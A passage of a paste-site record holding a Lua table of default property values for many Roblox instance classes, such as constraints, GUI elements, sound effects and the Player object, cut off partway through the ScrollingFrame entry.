id,title,username,language,date,content
qwDyCD6u,Classes properties+default,RomashkaHEHE,Lua,Saturday 17th of February 2024 11:51:18 PM CDT,"return {
	[""ShirtGraphic""] = {
		[""Archivable""] = true,
		[""Name""] = ""Shirt Graphic"",
		[""Parent""] = ""nill"",
		[""Graphic""] = """"
	},
	[""BallSocketConstraint""] = {
		[""Archivable""] = true,
		[""Name""] = ""BallSocketConstraint"",
		[""Parent""] = ""nill"",
		[""Attachment0""] = ""nill"",
		[""Attachment1""] = ""nill"",
		[""Color""] = BrickColor.new(""New Yeller""),
		[""Enabled""] = true,
		[""Visible""] = false,
		[""LimitsEnabled""] = false,
		[""Radius""] = 0.15000000596046448,
		[""Restitution""] = 0,
		[""TwistLimitsEnabled""] = false,
		[""TwistLowerAngle""] = -45,
		[""TwistUpperAngle""] = 45,
		[""UpperAngle""] = 45
	},
	[""BrickColorValue""] = {
		[""Archivable""] = true,
		[""Name""] = ""Value"",
		[""Parent""] = ""nill"",
		[""Value""] = BrickColor.new(""Medium stone grey"")
	},
	[""Accoutrement""] = {
		[""Archivable""] = true,
		[""Name""] = ""Accoutrement"",
		[""Parent""] = ""nill"",
		[""AttachmentForward""] = Vector3.new(-0, -0, -1),
		[""AttachmentPoint""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""AttachmentPos""] = Vector3.new(0, 0, 0),
		[""AttachmentRight""] = Vector3.new(1, 0, 0),
		[""AttachmentUp""] = Vector3.new(0, 1, 0)
	},
	[""GuiMain""] = {
		[""Archivable""] = true,
		[""Name""] = ""GuiMain"",
		[""Parent""] = ""nill"",
		[""AutoLocalize""] = true,
		[""RootLocalizationTable""] = ""nill"",
		[""Enabled""] = true,
		[""ResetOnSpawn""] = true,
		[""ZIndexBehavior""] = Enum.ZIndexBehavior.Global,
		[""DisplayOrder""] = 0,
		[""IgnoreGuiInset""] = false
	},
	[""VectorForce""] = {
		[""Archivable""] = true,
		[""Name""] = ""VectorForce"",
		[""Parent""] = ""nill"",
		[""Attachment0""] = ""nill"",
		[""Attachment1""] = ""nill"",
		[""Color""] = BrickColor.new(""Bright blue""),
		[""Enabled""] = true,
		[""Visible""] = false,
		[""ApplyAtCenterOfMass""] = false,
		[""Force""] = Vector3.new(1000, 0, 0),
		[""RelativeTo""] = Enum.ActuatorRelativeTo.Attachment0
	},
	[""HumanoidController""] = {
		[""Archivable""] = true,
		[""Name""] = ""Instance"",
		[""Parent""] = ""nill""
	},
	[""Handles""] = {
		[""Archivable""] = true,
		[""Name""] = ""Handles"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""Adornee""] = ""nill"",
		[""Faces""] = Right, Top, Back, Left, Bottom, Front,
		[""Style""] = Enum.HandlesStyle.Resize
	},
	[""RemoteEvent""] = {
		[""Archivable""] = true,
		[""Name""] = ""RemoteEvent"",
		[""Parent""] = ""nill""
	},
	[""Hole""] = {
		[""Archivable""] = true,
		[""Name""] = ""Hole"",
		[""Parent""] = ""nill"",
		[""FaceId""] = Enum.NormalId.Right,
		[""InOut""] = Enum.InOut.Center,
		[""LeftRight""] = Enum.LeftRight.Center,
		[""TopBottom""] = Enum.TopBottom.Center
	},
	[""Smoke""] = {
		[""Archivable""] = true,
		[""Name""] = ""Smoke"",
		[""Parent""] = ""nill"",
		[""Color""] = Color3.new(1, 1, 1),
		[""Enabled""] = true,
		[""Opacity""] = 0.5,
		[""RiseVelocity""] = 1,
		[""Size""] = 1
	},
	[""CSGDictionaryService""] = {
		[""Archivable""] = true,
		[""Name""] = ""CSGDictionaryService"",
		[""Parent""] = ""nill""
	},
	[""UIScale""] = {
		[""Archivable""] = true,
		[""Name""] = ""UIScale"",
		[""Parent""] = ""nill"",
		[""Scale""] = 1
	},
	[""CFrameValue""] = {
		[""Archivable""] = true,
		[""Name""] = ""Value"",
		[""Parent""] = ""nill"",
		[""Value""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	},
	[""ImageLabel""] = {
		[""Archivable""] = true,
		[""Name""] = ""ImageLabel"",
		[""Parent""] = ""nill"",
		[""AutoLocalize""] = true,
		[""RootLocalizationTable""] = ""nill"",
		[""Active""] = false,
		[""AnchorPoint""] = Vector2.new(0, 0),
		[""BackgroundColor3""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""BackgroundTransparency""] = 0,
		[""BorderColor3""] = Color3.new(0.105882, 0.164706, 0.207843),
		[""BorderSizePixel""] = 1,
		[""ClipsDescendants""] = false,
		[""LayoutOrder""] = 0,
		[""NextSelectionDown""] = ""nill"",
		[""NextSelectionLeft""] = ""nill"",
		[""NextSelectionRight""] = ""nill"",
		[""NextSelectionUp""] = ""nill"",
		[""Position""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""Rotation""] = 0,
		[""Selectable""] = false,
		[""SelectionImageObject""] = ""nill"",
		[""Size""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""SizeConstraint""] = Enum.SizeConstraint.RelativeXY,
		[""Visible""] = true,
		[""ZIndex""] = 1,
		[""Image""] = """",
		[""ImageColor3""] = Color3.new(1, 1, 1),
		[""ImageRectOffset""] = Vector2.new(0, 0),
		[""ImageRectSize""] = Vector2.new(0, 0),
		[""ImageTransparency""] = 0,
		[""ScaleType""] = Enum.ScaleType.Stretch,
		[""SliceCenter""] = Rect.new(Vector2.new(0, 0), Vector2.new(0, 0)),
		[""SliceScale""] = 1,
		[""TileSize""] = UDim2.new(UDim.new(1, 0), UDim.new(1, 0))
	},
	[""UIListLayout""] = {
		[""Archivable""] = true,
		[""Name""] = ""UIListLayout"",
		[""Parent""] = ""nill"",
		[""FillDirection""] = Enum.FillDirection.Vertical,
		[""HorizontalAlignment""] = Enum.HorizontalAlignment.Left,
		[""SortOrder""] = Enum.SortOrder.Name,
		[""VerticalAlignment""] = Enum.VerticalAlignment.Top,
		[""Padding""] = UDim.new(0, 0)
	},
	[""Torque""] = {
		[""Archivable""] = true,
		[""Name""] = ""Torque"",
		[""Parent""] = ""nill"",
		[""Attachment0""] = ""nill"",
		[""Attachment1""] = ""nill"",
		[""Color""] = BrickColor.new(""Bright blue""),
		[""Enabled""] = true,
		[""Visible""] = false,
		[""RelativeTo""] = Enum.ActuatorRelativeTo.Attachment0,
		[""Torque""] = Vector3.new(0, 0, 0)
	},
	[""PointLight""] = {
		[""Archivable""] = true,
		[""Name""] = ""PointLight"",
		[""Parent""] = ""nill"",
		[""Brightness""] = 1,
		[""Color""] = Color3.new(1, 1, 1),
		[""Enabled""] = true,
		[""Shadows""] = false,
		[""Range""] = 8
	},
	[""DoubleConstrainedValue""] = {
		[""Archivable""] = true,
		[""Name""] = ""Value"",
		[""Parent""] = ""nill"",
		[""MaxValue""] = 1,
		[""MinValue""] = 0,
		[""Value""] = 0
	},
	[""RocketPropulsion""] = {
		[""Archivable""] = true,
		[""Name""] = ""RocketPropulsion"",
		[""Parent""] = ""nill"",
		[""CartoonFactor""] = 0.699999988079071,
		[""MaxSpeed""] = 30,
		[""MaxThrust""] = 4000,
		[""MaxTorque""] = Vector3.new(400000, 400000, 0),
		[""Target""] = ""nill"",
		[""TargetOffset""] = Vector3.new(0, 0, 0),
		[""TargetRadius""] = 4,
		[""ThrustD""] = 0.0010000000474974513,
		[""ThrustP""] = 5,
		[""TurnD""] = 500,
		[""TurnP""] = 3000
	},
	[""BindableEvent""] = {
		[""Archivable""] = true,
		[""Name""] = ""Event"",
		[""Parent""] = ""nill""
	},
	[""ChorusSoundEffect""] = {
		[""Archivable""] = true,
		[""Name""] = ""ChorusSoundEffect"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""Priority""] = 0,
		[""Depth""] = 0.15000000596046448,
		[""Mix""] = 0.5,
		[""Rate""] = 0.5
	},
	[""TerrainRegion""] = {
		[""Archivable""] = true,
		[""Name""] = ""TerrainRegion"",
		[""Parent""] = ""nill""
	},
	[""Texture""] = {
		[""Archivable""] = true,
		[""Name""] = ""Texture"",
		[""Parent""] = ""nill"",
		[""Face""] = Enum.NormalId.Front,
		[""Color3""] = Color3.new(1, 1, 1),
		[""Texture""] = """",
		[""Transparency""] = 0,
		[""StudsPerTileU""] = 2,
		[""StudsPerTileV""] = 2
	},
	[""Script""] = {
		[""Archivable""] = true,
		[""Name""] = ""Script"",
		[""Parent""] = ""nill"",
		[""Disabled""] = false,
		[""LinkedSource""] = """"
	},
	[""LineHandleAdornment""] = {
		[""Archivable""] = true,
		[""Name""] = ""LineHandleAdornment"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""Adornee""] = ""nill"",
		[""AlwaysOnTop""] = false,
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""SizeRelativeOffset""] = Vector3.new(0, 0, 0),
		[""ZIndex""] = -1,
		[""Length""] = 5,
		[""Thickness""] = 1
	},
	[""RenderingTest""] = {
		[""Archivable""] = true,
		[""Name""] = ""RenderingTest"",
		[""Parent""] = ""nill"",
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""ComparisonDiffThreshold""] = 10,
		[""ComparisonMethod""] = Enum.RenderingTestComparisonMethod.psnr,
		[""ComparisonPsnrThreshold""] = 50,
		[""Description""] = """",
		[""FieldOfView""] = 70,
		[""Orientation""] = Vector3.new(-0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""QualityLevel""] = 21,
		[""ShouldSkip""] = false,
		[""Ticket""] = """"
	},
	[""TextBox""] = {
		[""Archivable""] = true,
		[""Name""] = ""TextBox"",
		[""Parent""] = ""nill"",
		[""AutoLocalize""] = true,
		[""RootLocalizationTable""] = ""nill"",
		[""Active""] = true,
		[""AnchorPoint""] = Vector2.new(0, 0),
		[""BackgroundColor3""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""BackgroundTransparency""] = 0,
		[""BorderColor3""] = Color3.new(0.105882, 0.164706, 0.207843),
		[""BorderSizePixel""] = 1,
		[""ClipsDescendants""] = false,
		[""LayoutOrder""] = 0,
		[""NextSelectionDown""] = ""nill"",
		[""NextSelectionLeft""] = ""nill"",
		[""NextSelectionRight""] = ""nill"",
		[""NextSelectionUp""] = ""nill"",
		[""Position""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""Rotation""] = 0,
		[""Selectable""] = true,
		[""SelectionImageObject""] = ""nill"",
		[""Size""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""SizeConstraint""] = Enum.SizeConstraint.RelativeXY,
		[""Visible""] = true,
		[""ZIndex""] = 1,
		[""ClearTextOnFocus""] = true,
		[""Font""] = Enum.Font.Legacy,
		[""LineHeight""] = 1,
		[""MultiLine""] = false,
		[""PlaceholderColor3""] = Color3.new(0.7, 0.7, 0.7),
		[""PlaceholderText""] = """",
		[""ShowNativeInput""] = true,
		[""Text""] = ""TextBox"",
		[""TextColor3""] = Color3.new(0.105882, 0.164706, 0.207843),
		[""TextScaled""] = false,
		[""TextSize""] = 8,
		[""TextStrokeColor3""] = Color3.new(0, 0, 0),
		[""TextStrokeTransparency""] = 1,
		[""TextTransparency""] = 0,
		[""TextTruncate""] = Enum.TextTruncate.None,
		[""TextWrapped""] = false,
		[""TextXAlignment""] = Enum.TextXAlignment.Center,
		[""TextYAlignment""] = Enum.TextYAlignment.Center
	},
	[""KeyframeSequence""] = {
		[""Archivable""] = true,
		[""Name""] = ""KeyframeSequence"",
		[""Parent""] = ""nill"",
		[""Loop""] = true,
		[""Priority""] = Enum.AnimationPriority.Action
	},
	[""FunctionalTest""] = {
		[""Archivable""] = true,
		[""Name""] = ""Instance"",
		[""Parent""] = ""nill"",
		[""Description""] = ""?""
	},
	[""BillboardGui""] = {
		[""Archivable""] = true,
		[""Name""] = ""BillboardGui"",
		[""Parent""] = ""nill"",
		[""AutoLocalize""] = true,
		[""RootLocalizationTable""] = ""nill"",
		[""Enabled""] = true,
		[""ResetOnSpawn""] = true,
		[""ZIndexBehavior""] = Enum.ZIndexBehavior.Global,
		[""Active""] = false,
		[""Adornee""] = ""nill"",
		[""AlwaysOnTop""] = false,
		[""ClipsDescendants""] = false,
		[""ExtentsOffset""] = Vector3.new(0, 0, 0),
		[""ExtentsOffsetWorldSpace""] = Vector3.new(0, 0, 0),
		[""LightInfluence""] = 0,
		[""MaxDistance""] = math.huge,
		[""PlayerToHideFrom""] = ""nill"",
		[""Size""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""SizeOffset""] = Vector2.new(0, 0),
		[""StudsOffset""] = Vector3.new(0, 0, 0),
		[""StudsOffsetWorldSpace""] = Vector3.new(0, 0, 0)
	},
	[""BodyThrust""] = {
		[""Archivable""] = true,
		[""Name""] = ""BodyThrust"",
		[""Parent""] = ""nill"",
		[""Force""] = Vector3.new(0, 1, 0),
		[""Location""] = Vector3.new(0, 0, 0)
	},
	[""Team""] = {
		[""Archivable""] = true,
		[""Name""] = ""Team"",
		[""Parent""] = ""nill"",
		[""AutoAssignable""] = true,
		[""TeamColor""] = BrickColor.new(""White"")
	},
	[""FlangeSoundEffect""] = {
		[""Archivable""] = true,
		[""Name""] = ""FlangeSoundEffect"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""Priority""] = 0,
		[""Depth""] = 0.44999998807907104,
		[""Mix""] = 0.8500000238418579,
		[""Rate""] = 5
	},
	[""EchoSoundEffect""] = {
		[""Archivable""] = true,
		[""Name""] = ""EchoSoundEffect"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""Priority""] = 0,
		[""Delay""] = 1,
		[""DryLevel""] = 0,
		[""Feedback""] = 0.5,
		[""WetLevel""] = 0
	},
	[""UITextSizeConstraint""] = {
		[""Archivable""] = true,
		[""Name""] = ""UITextSizeConstraint"",
		[""Parent""] = ""nill"",
		[""MaxTextSize""] = 100,
		[""MinTextSize""] = 1
	},
	[""AdvancedDragger""] = {
		[""Archivable""] = true,
		[""Name""] = ""AdvancedDragger"",
		[""Parent""] = ""nill""
	},
	[""BodyGyro""] = {
		[""Archivable""] = true,
		[""Name""] = ""BodyGyro"",
		[""Parent""] = ""nill"",
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""D""] = 500,
		[""MaxTorque""] = Vector3.new(400000, 0, 400000),
		[""P""] = 3000
	},
	[""Folder""] = {
		[""Archivable""] = true,
		[""Name""] = ""Folder"",
		[""Parent""] = ""nill""
	},
	[""FileMesh""] = {
		[""Archivable""] = true,
		[""Name""] = ""Mesh"",
		[""Parent""] = ""nill"",
		[""Offset""] = Vector3.new(0, 0, 0),
		[""Scale""] = Vector3.new(1, 1, 1),
		[""VertexColor""] = Vector3.new(1, 1, 1),
		[""MeshId""] = """",
		[""TextureId""] = """"
	},
	[""Animator""] = {
		[""Archivable""] = true,
		[""Name""] = ""Animator"",
		[""Parent""] = ""nill""
	},
	[""SkateboardPlatform""] = {
		[""Archivable""] = true,
		[""Name""] = ""SkateboardPlatform"",
		[""Parent""] = ""nill"",
		[""Anchored""] = false,
		[""BackParamA""] = -0.5,
		[""BackParamB""] = 0.5,
		[""BackSurface""] = Enum.SurfaceType.Smooth,
		[""BackSurfaceInput""] = Enum.InputType.NoInput,
		[""BottomParamA""] = -0.5,
		[""BottomParamB""] = 0.5,
		[""BottomSurface""] = Enum.SurfaceType.Inlet,
		[""BottomSurfaceInput""] = Enum.InputType.NoInput,
		[""BrickColor""] = BrickColor.new(""Medium stone grey""),
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""CanCollide""] = true,
		[""CollisionGroupId""] = 0,
		[""Color""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""CustomPhysicalProperties""] = ""nill"",
		[""FrontParamA""] = -0.5,
		[""FrontParamB""] = 0.5,
		[""FrontSurface""] = Enum.SurfaceType.Smooth,
		[""FrontSurfaceInput""] = Enum.InputType.NoInput,
		[""LeftParamA""] = -0.5,
		[""LeftParamB""] = 0.5,
		[""LeftSurface""] = Enum.SurfaceType.Smooth,
		[""LeftSurfaceInput""] = Enum.InputType.NoInput,
		[""Locked""] = false,
		[""Material""] = Enum.Material.Plastic,
		[""Orientation""] = Vector3.new(0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""Reflectance""] = 0,
		[""RightParamA""] = -0.5,
		[""RightParamB""] = 0.5,
		[""RightSurface""] = Enum.SurfaceType.Smooth,
		[""RightSurfaceInput""] = Enum.InputType.NoInput,
		[""RotVelocity""] = Vector3.new(0, 0, 0),
		[""Rotation""] = Vector3.new(0, 0, 0),
		[""Size""] = Vector3.new(4, 1.2000000476837158, 2),
		[""TopParamA""] = -0.5,
		[""TopParamB""] = 0.5,
		[""TopSurface""] = Enum.SurfaceType.Studs,
		[""TopSurfaceInput""] = Enum.InputType.NoInput,
		[""Transparency""] = 0,
		[""Velocity""] = Vector3.new(0, 0, 0),
		[""Shape""] = Enum.PartType.Block,
		[""Steer""] = 0,
		[""StickyWheels""] = true,
		[""Throttle""] = 0
	},
	[""DebuggerWatch""] = {
		[""Archivable""] = true,
		[""Name""] = ""DebuggerWatch"",
		[""Parent""] = ""nill"",
		[""Expression""] = """"
	},
	[""BlockMesh""] = {
		[""Archivable""] = true,
		[""Name""] = ""Mesh"",
		[""Parent""] = ""nill"",
		[""Offset""] = Vector3.new(0, 0, 0),
		[""Scale""] = Vector3.new(1, 1, 1),
		[""VertexColor""] = Vector3.new(1, 1, 1)
	},
	[""SkateboardController""] = {
		[""Archivable""] = true,
		[""Name""] = ""SkateboardController"",
		[""Parent""] = ""nill""
	},
	[""Beam""] = {
		[""Archivable""] = true,
		[""Name""] = ""Beam"",
		[""Parent""] = ""nill"",
		[""Attachment0""] = ""nill"",
		[""Attachment1""] = ""nill"",
		[""Color""] = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.new(1, 1, 1)),
			ColorSequenceKeypoint.new(1, Color3.new(1, 1, 1))
		}),
		[""CurveSize0""] = 0,
		[""CurveSize1""] = 0,
		[""Enabled""] = true,
		[""FaceCamera""] = false,
		[""LightEmission""] = 0,
		[""LightInfluence""] = 0,
		[""Segments""] = 10,
		[""Texture""] = """",
		[""TextureLength""] = 1,
		[""TextureMode""] = Enum.TextureMode.Stretch,
		[""TextureSpeed""] = 1,
		[""Transparency""] = NumberSequence.new({
			NumberSequenceKeypoint.new(0, 0.5),
			NumberSequenceKeypoint.new(1, 0.5)
		}),
		[""Width0""] = 1,
		[""Width1""] = 1,
		[""ZOffset""] = 0
	},
	[""BindableFunction""] = {
		[""Archivable""] = true,
		[""Name""] = ""Function"",
		[""Parent""] = ""nill""
	},
	[""ImageHandleAdornment""] = {
		[""Archivable""] = true,
		[""Name""] = ""ImageHandleAdornment"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.94902, 0.952941, 0.952941),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""Adornee""] = ""nill"",
		[""AlwaysOnTop""] = false,
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""SizeRelativeOffset""] = Vector3.new(0, 0, 0),
		[""ZIndex""] = -1,
		[""Image""] = ""rbxasset://textures/SurfacesDefault.png"",
		[""Size""] = Vector2.new(1, 1)
	},
	[""ObjectValue""] = {
		[""Archivable""] = true,
		[""Name""] = ""Value"",
		[""Parent""] = ""nill"",
		[""Value""] = ""nill""
	},
	[""CharacterMesh""] = {
		[""Archivable""] = true,
		[""Name""] = ""CharacterMesh"",
		[""Parent""] = ""nill"",
		[""BaseTextureId""] = 0,
		[""BodyPart""] = Enum.BodyPart.Head,
		[""MeshId""] = 0,
		[""OverlayTextureId""] = 0
	},
	[""BodyColors""] = {
		[""Archivable""] = true,
		[""Name""] = ""Body Colors"",
		[""Parent""] = ""nill"",
		[""HeadColor""] = BrickColor.new(""Cool yellow""),
		[""HeadColor3""] = Color3.new(0.992157, 0.917647, 0.552941),
		[""LeftArmColor""] = BrickColor.new(""Cool yellow""),
		[""LeftArmColor3""] = Color3.new(0.992157, 0.917647, 0.552941),
		[""LeftLegColor""] = BrickColor.new(""Bright blue""),
		[""LeftLegColor3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""RightArmColor""] = BrickColor.new(""Cool yellow""),
		[""RightArmColor3""] = Color3.new(0.992157, 0.917647, 0.552941),
		[""RightLegColor""] = BrickColor.new(""Bright blue""),
		[""RightLegColor3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""TorsoColor""] = BrickColor.new(""Dark green""),
		[""TorsoColor3""] = Color3.new(0.156863, 0.498039, 0.278431)
	},
	[""ColorCorrectionEffect""] = {
		[""Archivable""] = true,
		[""Name""] = ""ColorCorrection"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""Brightness""] = 0,
		[""Contrast""] = 0,
		[""Saturation""] = 0,
		[""TintColor""] = Color3.new(1, 1, 1)
	},
	[""RopeConstraint""] = {
		[""Archivable""] = true,
		[""Name""] = ""RopeConstraint"",
		[""Parent""] = ""nill"",
		[""Attachment0""] = ""nill"",
		[""Attachment1""] = ""nill"",
		[""Color""] = BrickColor.new(""Earth orange""),
		[""Enabled""] = true,
		[""Visible""] = false,
		[""Length""] = 5,
		[""Restitution""] = 0,
		[""Thickness""] = 0.10000000149011612
	},
	[""SelectionBox""] = {
		[""Archivable""] = true,
		[""Name""] = ""SelectionBox"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""Adornee""] = ""nill"",
		[""LineThickness""] = 0.15000000596046448,
		[""SurfaceColor3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""SurfaceTransparency""] = 1
	},
	[""CustomEvent""] = {
		[""Archivable""] = true,
		[""Name""] = ""CustomEvent"",
		[""Parent""] = ""nill""
	},
	[""IntValue""] = {
		[""Archivable""] = true,
		[""Name""] = ""Value"",
		[""Parent""] = ""nill"",
		[""Value""] = 0
	},
	[""FloorWire""] = {
		[""Archivable""] = true,
		[""Name""] = ""FloorWire"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""CycleOffset""] = 0,
		[""From""] = ""nill"",
		[""StudsBetweenTextures""] = 4,
		[""Texture""] = """",
		[""TextureSize""] = Vector2.new(1, 1),
		[""To""] = ""nill"",
		[""Velocity""] = 2,
		[""WireRadius""] = 0.0625
	},
	[""BinaryStringValue""] = {
		[""Archivable""] = true,
		[""Name""] = ""Value"",
		[""Parent""] = ""nill""
	},
	[""Glue""] = {
		[""Archivable""] = true,
		[""Name""] = ""Glue"",
		[""Parent""] = ""nill"",
		[""C0""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""C1""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""Part0""] = ""nill"",
		[""Part1""] = ""nill"",
		[""F0""] = Vector3.new(0, 0, 0),
		[""F1""] = Vector3.new(0, 0, 0),
		[""F2""] = Vector3.new(0, 0, 0),
		[""F3""] = Vector3.new(0, 0, 0)
	},
	[""UIGridLayout""] = {
		[""Archivable""] = true,
		[""Name""] = ""UIGridLayout"",
		[""Parent""] = ""nill"",
		[""FillDirection""] = Enum.FillDirection.Horizontal,
		[""HorizontalAlignment""] = Enum.HorizontalAlignment.Left,
		[""SortOrder""] = Enum.SortOrder.Name,
		[""VerticalAlignment""] = Enum.VerticalAlignment.Top,
		[""CellPadding""] = UDim2.new(UDim.new(0, 5), UDim.new(0, 5)),
		[""CellSize""] = UDim2.new(UDim.new(0, 100), UDim.new(0, 100)),
		[""FillDirectionMaxCells""] = 0,
		[""StartCorner""] = Enum.StartCorner.TopLeft
	},
	[""ManualWeld""] = {
		[""Archivable""] = true,
		[""Name""] = ""ManualWeld"",
		[""Parent""] = ""nill"",
		[""C0""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""C1""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""Part0""] = ""nill"",
		[""Part1""] = ""nill""
	},
	[""SoundGroup""] = {
		[""Archivable""] = true,
		[""Name""] = ""SoundGroup"",
		[""Parent""] = ""nill"",
		[""Volume""] = 0.5
	},
	[""SunRaysEffect""] = {
		[""Archivable""] = true,
		[""Name""] = ""SunRays"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""Intensity""] = 0.25,
		[""Spread""] = 1
	},
	[""Pose""] = {
		[""Archivable""] = true,
		[""Name""] = ""Pose"",
		[""Parent""] = ""nill"",
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""EasingDirection""] = Enum.PoseEasingDirection.In,
		[""EasingStyle""] = Enum.PoseEasingStyle.Linear,
		[""Weight""] = 1
	},
	[""AnalyticsService""] = {
		[""Archivable""] = true,
		[""Name""] = ""AnalyticsService"",
		[""Parent""] = ""nill""
	},
	[""AlignPosition""] = {
		[""Archivable""] = true,
		[""Name""] = ""AlignPosition"",
		[""Parent""] = ""nill"",
		[""Attachment0""] = ""nill"",
		[""Attachment1""] = ""nill"",
		[""Color""] = BrickColor.new(""Medium stone grey""),
		[""Enabled""] = true,
		[""Visible""] = false,
		[""ApplyAtCenterOfMass""] = false,
		[""MaxForce""] = 10000,
		[""MaxVelocity""] = math.huge,
		[""ReactionForceEnabled""] = false,
		[""Responsiveness""] = 10,
		[""RigidityEnabled""] = false
	},
	[""HingeConstraint""] = {
		[""Archivable""] = true,
		[""Name""] = ""HingeConstraint"",
		[""Parent""] = ""nill"",
		[""Attachment0""] = ""nill"",
		[""Attachment1""] = ""nill"",
		[""Color""] = BrickColor.new(""New Yeller""),
		[""Enabled""] = true,
		[""Visible""] = false,
		[""ActuatorType""] = Enum.ActuatorType.None,
		[""AngularSpeed""] = 0,
		[""AngularVelocity""] = 0,
		[""LimitsEnabled""] = false,
		[""LowerAngle""] = -45,
		[""MotorMaxAcceleration""] = 500000,
		[""MotorMaxTorque""] = 0,
		[""Radius""] = 0.15000000596046448,
		[""Restitution""] = 0,
		[""ServoMaxTorque""] = 0,
		[""TargetAngle""] = 0,
		[""UpperAngle""] = 45
	},
	[""Message""] = {
		[""Archivable""] = true,
		[""Name""] = ""Message"",
		[""Parent""] = ""nill"",
		[""Text""] = """"
	},
	[""Player""] = {
		[""Archivable""] = true,
		[""Name""] = ""Player"",
		[""Parent""] = ""nill"",
		[""AutoJumpEnabled""] = true,
		[""CameraMaxZoomDistance""] = 400,
		[""CameraMinZoomDistance""] = 0.5,
		[""CameraMode""] = Enum.CameraMode.Classic,
		[""CanLoadCharacterAppearance""] = true,
		[""Character""] = ""nill"",
		[""CharacterAppearanceId""] = 0,
		[""DevCameraOcclusionMode""] = Enum.DevCameraOcclusionMode.Zoom,
		[""DevComputerCameraMode""] = Enum.DevComputerCameraMovementMode.UserChoice,
		[""DevComputerMovementMode""] = Enum.DevComputerMovementMode.UserChoice,
		[""DevEnableMouseLock""] = true,
		[""DevTouchCameraMode""] = Enum.DevTouchCameraMovementMode.UserChoice,
		[""DevTouchMovementMode""] = Enum.DevTouchMovementMode.UserChoice,
		[""HealthDisplayDistance""] = 100,
		[""NameDisplayDistance""] = 100,
		[""Neutral""] = true,
		[""ReplicationFocus""] = ""nill"",
		[""RespawnLocation""] = ""nill"",
		[""Team""] = ""nill"",
		[""TeamColor""] = BrickColor.new(""White""),
		[""UserId""] = 0
	},
	[""BoxHandleAdornment""] = {
		[""Archivable""] = true,
		[""Name""] = ""BoxHandleAdornment"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""Adornee""] = ""nill"",
		[""AlwaysOnTop""] = false,
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""SizeRelativeOffset""] = Vector3.new(0, 0, 0),
		[""ZIndex""] = -1,
		[""Size""] = Vector3.new(1, 1, 1)
	},
	[""ScrollingFrame""] = {
		[""Archivable""] = true,
		[""Name""] = ""ScrollingFrame"",
		[""Parent""] = ""nill"",
		[""AutoLocalize""] = true,
		[""RootLocalizationTable""] = ""nill"",
		[""Active""] = false,
		[""AnchorPoint""] = Vector2.new(0, 0),
		[""BackgroundColor3""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""BackgroundTransparency""] = 0,
		[""BorderColor3""] = Color3.new(0.105882, 0.164706, 0.207843),
		[""BorderSizePixel""] = 1,
		[""ClipsDescendants""] = true,
		[""LayoutOrder""] = 0,
		[""NextSelectionDown""] = ""nill"",
		[""NextSelectionLeft""] = ""nill"",
		[""NextSelectionRight""] = ""nill"",
		[""NextSelectionUp""] = ""nill"",
		[""Position""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""Rotation""] = 0,
		[""Selectable""] = true,
		[""SelectionImageObject""] = ""nill"",
		[""Size""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""SizeConstraint""] = Enum.SizeConstraint.RelativeXY,
		[""Visible""] = true,
		[""ZIndex""] = 1,
		[""BottomImage""] = ""rbxasset://textures/ui/Scroll/scroll-bottom.png"",
